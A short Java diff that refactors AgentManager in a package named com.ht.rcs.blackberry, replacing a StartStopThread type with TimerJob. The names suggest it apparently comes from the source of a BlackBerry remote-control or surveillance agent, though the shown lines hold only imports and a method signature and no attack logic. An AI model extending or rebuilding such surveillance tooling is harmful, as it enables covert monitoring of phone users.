@@ -12,10 +12,10 @@ import java.util.Vector;
 
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.interfaces.Singleton;
+import com.ht.rcs.blackberry.threadpool.TimerJob;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.StartStopThread;
 
 /**
  * The Class AgentManager.
@@ -60,7 +60,7 @@ public final class AgentManager extends Manager implements Singleton {
         return agents;
     }
 
-    public StartStopThread getItem(int id) {
+    public TimerJob getItem(int id) {
         // #ifdef DBC
         Check.requires(statusObj != null, "Null status");
         // #endif
